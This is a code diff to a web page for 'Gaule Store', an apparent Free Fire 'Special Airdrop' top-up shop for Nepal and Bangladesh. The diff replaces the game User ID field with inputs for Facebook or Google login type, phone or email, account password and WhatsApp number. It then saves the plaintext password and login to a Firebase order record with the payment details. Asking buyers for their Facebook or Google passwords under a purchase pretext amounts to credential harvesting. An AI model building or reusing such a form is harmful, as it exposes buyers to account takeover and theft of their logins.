@@ -352,6 +352,45 @@
             line-height: 1.4;
         }
 
+        /* Account Type Selection Styling */
+        .account-type-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 12px;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+            padding: 4px;
+        }
+
+        .account-type-grid.error-border {
+            border: 2px solid #e53e3e !important;
+            background-color: #fff5f5;
+            padding: 8px;
+        }
+
+        .account-type-card {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 14px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            background: #ffffff;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+
+        .account-type-card.selected {
+            border-color: #ffb300 !important;
+            background-color: #fffdf5 !important;
+            color: #1a202c !important;
+        }
+
         /* --- PACKS GRID --- */
         .cards-grid {
             display: grid;
@@ -378,13 +417,16 @@
             cursor: pointer;
             box-shadow: 0 4px 6px rgba(0,0,0,0.02);
             transition: transform 0.1s, border-color 0.2s;
+            display: flex;          
+            flex-direction: column; 
+            align-items: center;    
+            text-align: center;     
         }
 
         .pack-card:active { transform: scale(0.98); }
         .pack-card.selected { border: 2px solid #ffb300 !important; background-color: #fffdf5; }
         .pack-title { font-size: 14px; font-weight: 600; margin-bottom: 12px; color: #1a202c; }
         .pack-price { font-size: 15px; font-weight: 700; color: #ffb300; }
-        .diamond-icon { position: absolute; bottom: 14px; right: 14px; color: #3182ce; font-size: 20px; }
 
         /* --- DRAWER --- */
         .bottom-drawer {
@@ -406,7 +448,6 @@
         .total-row { margin-top: 12px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
         .total-price { font-size: 20px; font-weight: 700; color: #ffb300; }
 
-        /* बटनको लम्बाई (Width) र उचाई (Padding) मात्र घटाइएको ओरिजिनल क्लास */
         .action-btn {
             display: flex;
             justify-content: center;
@@ -418,13 +459,11 @@
             color: #ffffff;
             background-color: #ffb300;
             transition: background 0.2s;
-            
-            /* यहाँबाट बटन छोटो बनाइएको छ */
-            width: 200px;            /* पूरा चौडाईको साटो मात्र २०० पिक्सल लम्बाई */
-            height: 42px;            /* फिक्स आकर्षक उचाई */
-            font-size: 14px;         
-            border-radius: 25px;     /* क्याप्सुल गोलो लुक्स */
-            margin: 0 auto;          /* बटनलाई एकदम बीच (Center) मा राख्न */
+            width: 200px;
+            height: 42px;
+            font-size: 14px;
+            border-radius: 25px;
+            margin: 0 auto;
         }
         
         .action-btn.login-needed {
@@ -442,6 +481,7 @@
             background-color: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px; padding: 24px;
             max-width: 380px; width: 100%; text-align: center; position: relative; transform: scale(0.8);
             transition: all 0.3s ease; box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-height: 90vh; overflow-y: auto;
         }
         .qr-modal.show .qr-card { transform: scale(1); }
         .close-modal { position: absolute; top: 15px; right: 15px; font-size: 20px; color: #718096; cursor: pointer; }
@@ -487,6 +527,14 @@
         .receipt-row span:first-child { color: #718096; }
         .receipt-row span:last-child { color: #2d3748; font-weight: 600; }
         .success-close-btn { background-color: #1a202c; color: #ffffff; border: none; width: 100%; padding: 12px; font-weight: 600; border-radius: 8px; cursor: pointer; }
+        
+        .pack-img {
+            width: 75%; 
+            max-height: 65%;
+            object-fit: contain;
+            margin-bottom: auto;
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
@@ -499,178 +547,103 @@
         <div class="banner-flex">
             <img class="avatar-img" src="airdrop.png" alt="Special Airdop">
             <div>
-<div class="badge Region">Nepal/Bangladesh </div>
+                <div class="badge Region">Nepal/Bangladesh </div>
                 <p class="banner-desc">Buy Garena Fire Special Airdrop in Nepal at the cheapest price with Gaule Store.</p>
             </div>
         </div>
-
     </div>
 
     <div class="tabs-container">
-        <div class="tab active">Special Airdop</div>
+        <div class="tab active">Special Airdrop</div>
     </div>
 
-
-
-
-
-
-<div class="section-box">
-    <div class="section-header-flex">
-        <div class="box-title">User ID <span style="color: #e53e3e;">*</span></div>
-    </div>
-    <div class="input-card-panel">
-        <div class="input-label">Your User Id</div>
-            <input type="text" id="game-uid" class="uid-input" placeholder="Enter User ID" oninput="validateUIDAuto()">
-
-        <div id="player-name-display" style="margin-top: 10px; padding: 10px; border-radius: 8px; background: #f0fff4; border: 1px solid #9ae6b4; display: none;">
-            <i class="fa-solid fa-user-check" style="color: #22543d;"></i> 
-            
-        </div>
-        
-        <div class="error-message" id="uid-error" style="display: none; color: #e53e3e; font-size: 12px; margin-top: 8px;">
-               </div>
-        
-        <div class="instruction-text" style="margin-top: 10px;">
-            <i class="fa-solid fa-circle-info"></i>
-            <span>Open Free fire, Click on Profile icon, you will get your ID.</span>
-        </div>
-    </div>
-</div>
-
-
-
-
+    <!-- Account Credentials & Contact Section -->
     <div class="section-box">
         <div class="section-header-flex">
-            <div class="box-title">Special Airdop<span style="color: #e53e3e;">*</span></div>
+            <div class="box-title">Account Credentials & Contact <span style="color: #e53e3e;">*</span></div>
+        </div>
+        <div class="input-card-panel" style="display: flex; flex-direction: column; gap: 12px;">
+            
+            <!-- Account Type Selection (Facebook / Google) -->
+            <div>
+                <div class="input-label" style="margin-bottom: 5px; font-size: 11px; font-weight: 600;">Login Type <span style="color: #e53e3e;">*</span></div>
+                <div class="account-type-grid" id="account-type-wrapper">
+                    <div class="account-type-card" data-type="Facebook" onclick="selectAccountType(this)">
+                        <i class="fa-brands fa-facebook" style="color: #1877f2;"></i> Facebook
+                    </div>
+                    <div class="account-type-card" data-type="Google" onclick="selectAccountType(this)">
+                        <i class="fa-brands fa-google" style="color: #ea4335;"></i> Google
+                    </div>
+                </div>
+                <div class="error-message" id="account-type-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>Please select Facebook or Google!</span>
+                </div>
+            </div>
+
+            <!-- Phone Number or Email Input -->
+            <div>
+                <div class="input-label">Phone Number or Email</div>
+                <input type="text" id="game-phone-email" class="uid-input" placeholder="Enter Phone Number or Email" oninput="validateField('game-phone-email', 'phone-email-error')">
+                <div class="error-message" id="phone-email-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>Phone number or email is required!</span>
+                </div>
+            </div>
+
+            <!-- Password Input -->
+            <div>
+                <div class="input-label">Password</div>
+                <input type="password" id="game-password" class="uid-input" placeholder="Enter Password" oninput="validateField('game-password', 'password-error')">
+                <div class="error-message" id="password-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>Password is required!</span>
+                </div>
+            </div>
+
+            <!-- WhatsApp Number Input -->
+            <div>
+                <div class="input-label">WhatsApp Number</div>
+                <input type="tel" id="whatsapp-number" class="uid-input" placeholder="Enter WhatsApp Number" oninput="validateField('whatsapp-number', 'whatsapp-error')">
+                <div class="error-message" id="whatsapp-error">
+                    <i class="fa-solid fa-circle-exclamation"></i> <span>WhatsApp number is required!</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Special Airdrop Section -->
+    <div class="section-box">
+        <div class="section-header-flex">
+            <div class="box-title">Special Airdrop <span style="color: #e53e3e;">*</span></div>
         </div>
         
         <div class="error-message" id="pack-error" style="margin-bottom: 8px;">
             <i class="fa-solid fa-circle-exclamation"></i> <span>Please select a Special Airdrop!</span>
         </div>
 
-<style>
-    .section-box { margin: 15px 0; }
+        <div class="cards-grid" id="diamonds-wrapper">
+            <div class="pack-card" onclick="selectPack(this, '0$-0.99$', '190')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">0$-0.99$</div>
+                <div class="pack-price">Rs.190</div>
+            </div>
 
-    .box-title {
-        font-weight: bold;
-        margin-bottom: 10px;
-        padding-left: 5px;
-    }
+            <div class="pack-card" onclick="selectPack(this, '1$-1.99$', '360')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">1$-1.99$</div>
+                <div class="pack-price">Rs.360</div>
+            </div>
 
-    .cards-grid {
-        display: grid;
-        grid-template-columns: repeat(2, 1fr);
-        gap: 12px;
-    }
+            <div class="pack-card" onclick="selectPack(this, '2$-2.99$', '510')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">2$-2.99$</div>
+                <div class="pack-price">Rs.510</div>
+            </div>
 
-    .pack-card {
-        aspect-ratio: 1 / 1;
-        display: flex;
-        flex-direction: column;
-        justify-content: flex-end;
-        align-items: center;
-        padding: 8px;
-        border: 2px solid #e2e8f0;
-        border-radius: 18px;
-        background: #ffffff;
-        cursor: pointer;
-        transition: 0.2s;
-    }
-
-    .pack-card.active { border-color: #ecc94b; background-color: #fffcf0; }
-
-    /* Image size thulo banayeko */
-    .pack-img {
-        width: 75%; 
-        max-height: 65%;
-        object-fit: contain;
-        margin-bottom: auto;
-        margin-top: 8px;
-    }
-
-    .pack-title { font-weight: bold; font-size: 13px; margin-bottom: 2px; }
-    .pack-price { color: #e53e3e; font-weight: bold; font-size: 15px; margin-bottom: 5px; }
-</style>
-
-
-    <div class="cards-grid" id="diamonds-wrapper">
-        <div class="pack-card" onclick="selectPack(this, '0$-0.99$', '190')">
-            <img src="airdrop.png" class="pack-img" alt="airdrop">
-            <div class="pack-title">0$-0.99$</div>
-            <div class="pack-price">Rs.190</div>
+            <div class="pack-card" onclick="selectPack(this, '3$-3.99$', '675')">
+                <img src="airdrop.png" class="pack-img" alt="airdrop">
+                <div class="pack-title">3$-3.99$</div>
+                <div class="pack-price">Rs.675</div>
+            </div>
         </div>
-
-        <div class="pack-card" onclick="selectPack(this, '1$-1.99$', '360')">
-            <img src="airdrop.png" class="pack-img" alt="airdrop">
-            <div class="pack-title">1$-1.99$</div>
-            <div class="pack-price">Rs.360</div>
-        </div>
-    </div>
-</div>
-
-
-
-
-    <div class="cards-grid" id="diamonds-wrapper">
-        <div class="pack-card" onclick="selectPack(this, '2$-2.99$', '510')">
-            <img src="airdrop.png" class="pack-img" alt="airdrop">
-            <div class="pack-title">2$-2.99$</div>
-            <div class="pack-price">Rs.510</div>
-        </div>
-
-        <div class="pack-card" onclick="selectPack(this, '3$-3.99$', '675')">
-            <img src="airdrop.png" class="pack-img" alt="airdrop">
-            <div class="pack-title">3$-3.99$</div>
-            <div class="pack-price">Rs.675</div>
-        </div>
-    </div>
-</div>
-
-
-
-
-<style>
-    .section-box {
-        margin: 20px 0;
-    }
-    .cards-grid {
-        display: grid;
-        grid-template-columns: repeat(2, 1fr);
-        gap: 15px;
-    }
-    .pack-card {
-        aspect-ratio: 1 / 1;
-        display: flex;
-        flex-direction: column;
-        justify-content: flex-end;
-        align-items: center;
-        padding: 10px;
-        border: 2px solid #e2e8f0;
-        border-radius: 20px;
-        background: #ffffff;
-        cursor: pointer;
-        position: relative;
-        overflow: hidden;
-    }
-    /* Glorybot image style */
-    .pack-img {
-        width: 100%;
-        max-height: 60%;
-        object-fit: contain;
-        margin-bottom: auto;
-        margin-top: 5px;
-    }
-    .pack-title { font-weight: bold; font-size: 14px; }
-    .pack-price { color: #e53e3e; font-weight: bold; font-size: 16px; }
-</style>
-
-
- 
-
-
-</div>
     </div>
 
     <div class="bottom-drawer">
@@ -718,8 +691,8 @@
 
             <div class="payment-summary-box">
                 <div class="pay-row">
-                    <span>User ID:</span>
-                    <span id="modal-uid" style="font-weight: bold; color: #1a202c;">-</span>
+                    <span>Login Type:</span>
+                    <span id="modal-account-type" style="font-weight: bold; color: #1a202c;">-</span>
                 </div>
                 <div class="pay-row">
                     <span>Selected Pack:</span>
@@ -745,8 +718,8 @@
             
             <div class="success-receipt-info">
                 <div class="receipt-row">
-                    <span>Game ID:</span>
-                    <span id="receipt-uid">-</span>
+                    <span>Login Type:</span>
+                    <span id="receipt-account-type">-</span>
                 </div>
                 <div class="receipt-row">
                     <span>Item:</span>
@@ -789,12 +762,19 @@
         let currentUser = null;
         let selectedItemName = "";
         let selectedItemPrice = "";
+        let selectedAccountType = "";
 
         const mainActionBtn = document.getElementById('main-action-btn');
-        const gameUidInput = document.getElementById('game-uid');
-        const uidError = document.getElementById('uid-error');
+        const gamePhoneEmailInput = document.getElementById('game-phone-email');
+        const phoneEmailError = document.getElementById('phone-email-error');
+        const gamePasswordInput = document.getElementById('game-password');
+        const passwordError = document.getElementById('password-error');
+        const whatsappInput = document.getElementById('whatsapp-number');
+        const whatsappError = document.getElementById('whatsapp-error');
         const packError = document.getElementById('pack-error');
         const diamondsWrapper = document.getElementById('diamonds-wrapper');
+        const accountTypeWrapper = document.getElementById('account-type-wrapper');
+        const accountTypeError = document.getElementById('account-type-error');
         const txidInput = document.getElementById('txid');
         const txidError = document.getElementById('txid-error');
 
@@ -810,35 +790,13 @@
             }
         });
 
-        mainActionBtn.onclick = function() {
-            if (!currentUser) {
-                signInWithPopup(auth, provider).then((result) => {
-                    console.log("Logged in!");
-                }).catch((error) => {
-                    alert("लगइन असफल भयो: " + error.message);
-                });
-                return;
-            }
+        window.selectAccountType = function(element) {
+            accountTypeWrapper.classList.remove('error-border');
+            accountTypeError.style.display = "none";
 
-            let isFormValid = true;
-
-            if (!selectedItemName) {
-                diamondsWrapper.classList.add('error-border');
-                packError.style.display = "flex";
-                diamondsWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                isFormValid = false;
-            }
-
-            let uidValue = gameUidInput.value.trim();
-            if (uidValue === "") {
-                gameUidInput.classList.add('error-border');
-                uidError.style.display = "flex";
-                if(isFormValid) gameUidInput.focus();
-                isFormValid = false;
-            }
-
-            if(!isFormValid) return;
-            openPaymentModal(uidValue);
+            document.querySelectorAll('.account-type-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedAccountType = element.getAttribute('data-type');
         };
 
         window.selectPack = function(element, name, price) {
@@ -855,10 +813,12 @@
             document.getElementById('summary-total').innerText = 'Rs ' + price;
         };
 
-        window.validateUIDLive = function() {
-            if (gameUidInput.value.trim() !== "") {
-                gameUidInput.classList.remove('error-border');
-                uidError.style.display = "none";
+        window.validateField = function(fieldId, errorId) {
+            let field = document.getElementById(fieldId);
+            let err = document.getElementById(errorId);
+            if (field.value.trim() !== "") {
+                field.classList.remove('error-border');
+                err.style.display = "none";
             }
         };
 
@@ -869,8 +829,71 @@
             }
         };
 
-        function openPaymentModal(uid) {
-            document.getElementById('modal-uid').innerText = uid;
+        mainActionBtn.onclick = function() {
+            if (!currentUser) {
+                signInWithPopup(auth, provider).then((result) => {
+                    console.log("Logged in!");
+                }).catch((error) => {
+                    alert("लगइन असफल भयो: " + error.message);
+                });
+                return;
+            }
+
+            let isFormValid = true;
+
+            if (!selectedAccountType) {
+                accountTypeWrapper.classList.add('error-border');
+                accountTypeError.style.display = "flex";
+                accountTypeWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                isFormValid = false;
+            }
+
+            let phoneEmailValue = gamePhoneEmailInput.value.trim();
+            if (phoneEmailValue === "") {
+                gamePhoneEmailInput.classList.add('error-border');
+                phoneEmailError.style.display = "flex";
+                if(isFormValid) {
+                    gamePhoneEmailInput.focus();
+                    gamePhoneEmailInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                isFormValid = false;
+            }
+
+            let passwordValue = gamePasswordInput.value.trim();
+            if (passwordValue === "") {
+                gamePasswordInput.classList.add('error-border');
+                passwordError.style.display = "flex";
+                if(isFormValid) {
+                    gamePasswordInput.focus();
+                    gamePasswordInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                isFormValid = false;
+            }
+
+            let whatsappValue = whatsappInput.value.trim();
+            if (whatsappValue === "") {
+                whatsappInput.classList.add('error-border');
+                whatsappError.style.display = "flex";
+                if(isFormValid) {
+                    whatsappInput.focus();
+                    whatsappInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                isFormValid = false;
+            }
+
+            if (!selectedItemName) {
+                diamondsWrapper.classList.add('error-border');
+                packError.style.display = "flex";
+                if(isFormValid) diamondsWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                isFormValid = false;
+            }
+
+            if(!isFormValid) return;
+            openPaymentModal();
+        };
+
+        function openPaymentModal() {
+            document.getElementById('modal-account-type').innerText = selectedAccountType;
             document.getElementById('modal-item').innerText = selectedItemName;
             document.getElementById('modal-total').innerText = 'Rs ' + selectedItemPrice;
             
@@ -878,7 +901,6 @@
             txidInput.classList.remove('error-border');
             txidError.style.display = "none";
 
-            // नयाँ पेमेन्ट खोल्दा बटनलाई पुनः सक्रिय (Reset) गर्ने
             const submitBtn = document.querySelector('.done-btn');
             if (submitBtn) {
                 submitBtn.disabled = false;
@@ -894,10 +916,11 @@
             document.getElementById('qrModal').classList.remove('show');
         };
 
-        // अर्डर Firebase मा पठाउने फंक्सन (Double click सुरक्षा सहित)
         window.submitPayment = function() {
             let txidValue = txidInput.value.trim();
-            let uidValue = gameUidInput.value.trim();
+            let phoneEmailValue = gamePhoneEmailInput.value.trim();
+            let passwordValue = gamePasswordInput.value.trim();
+            let whatsappValue = whatsappInput.value.trim();
             
             if (txidValue === "") {
                 txidInput.classList.add('error-border');
@@ -906,7 +929,6 @@
                 return;
             }
 
-            // --- डबल सबमिसन रोक्न बटनलाई डिसेबल (Disabled) गर्ने ---
             const submitBtn = document.querySelector('.done-btn');
             if (submitBtn) {
                 submitBtn.disabled = true;
@@ -925,21 +947,23 @@
                 email: currentUser.email,
                 name: currentUser.displayName || "User",
                 userId: currentUser.uid,
+                accountType: selectedAccountType,
                 product: selectedItemName,
                 amountDue: selectedItemPrice,
-                uid: uidValue,
+                phoneOrEmail: phoneEmailValue,
+                password: passwordValue,
+                whatsapp: whatsappValue,
                 transactionId: txidValue,
                 status: "Pending"
             }).then(() => {
                 closePaymentModal();
-                document.getElementById('receipt-uid').innerText = uidValue;
+                document.getElementById('receipt-account-type').innerText = selectedAccountType;
                 document.getElementById('receipt-item').innerText = selectedItemName;
                 document.getElementById('receipt-price').innerText = 'Rs ' + selectedItemPrice;
                 document.getElementById('successModal').classList.add('show');
             }).catch((error) => {
                 alert("अर्डर पठाउन समस्या भयो: " + error.message);
                 
-                // एरर आएमा बटन फेरि अन गर्ने ताकि प्रयोगकर्ताले ट्राइ गर्न सकोस्
                 if (submitBtn) {
                     submitBtn.disabled = false;
                     submitBtn.innerText = "Submit Payment";
